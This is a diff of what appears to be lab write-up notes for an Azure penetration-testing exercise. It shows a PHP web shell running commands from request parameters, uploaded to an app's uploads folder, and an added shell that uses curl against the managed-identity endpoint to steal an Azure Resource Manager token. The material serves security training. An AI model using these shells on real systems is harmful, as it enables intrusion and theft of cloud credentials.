@@ -363,9 +363,7 @@ listening on [any] 4444 ...
 now lets upload hilarious shell:-
 ```
 <?php 
-
 system($_REQUEST['cmd']);
-
 ?>
 ```
 Now we can navigate to:
@@ -374,6 +372,14 @@ https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
 ```
 •  If the app service contains environment variables IDENTITY_HEADER and IDENTITY_ENDPOINT, it has a **managed identity**.
 • and then we can request an ARM toke by passing the IDENTITY_HEADER using curl in php webshell:
+```
+<?php 
+
+system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+
+?>
+```
+Now we can navigate to:
 ```
 https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml
 ```
